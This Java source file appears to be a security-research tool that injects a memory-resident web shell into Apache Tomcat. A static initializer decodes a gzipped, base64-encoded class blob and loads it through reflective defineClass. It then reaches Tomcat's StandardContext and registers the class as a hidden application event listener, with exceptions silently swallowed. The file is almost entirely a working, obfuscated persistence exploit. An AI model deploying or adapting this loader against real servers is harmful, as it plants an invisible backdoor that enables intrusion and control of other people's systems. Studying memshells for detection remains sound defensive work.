package com.demo.memshell.loader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 */
public class TomcatContextClassLoader {
    public static String base64Str = "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";
    static {
        try {
            byte[] bytes = decompress(Base64.getDecoder().decode(base64Str));

            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
            Object object = cls.newInstance();

            // 获取 standardContext
            Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
            Object standardContext;
            try {
                Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                getResourcesmethod.setAccessible(true);
                Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                getContextmethod.setAccessible(true);
                standardContext = getContextmethod.invoke(resources);
            } catch (Exception ignored) {
                Object root = getFieldValue(webappClassLoaderBase, "resources");
                standardContext = getFieldValue(root, "context");
            }

            List<Object> applicationEventListeners = (List<Object>) getFieldValue(standardContext, "applicationEventListenersList");
            for (Object applicationEventListener : applicationEventListeners) {
                if (applicationEventListener.getClass().getName().contains(object.getClass().getName())) {
                    applicationEventListeners.remove(applicationEventListener);
                    break;
                }
            }

            standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, object);

        }catch (Exception e){

        }
    }

    public static byte[] decompress(byte[] compressedData) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try (GZIPInputStream gzipInputStream = new GZIPInputStream(bais)) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
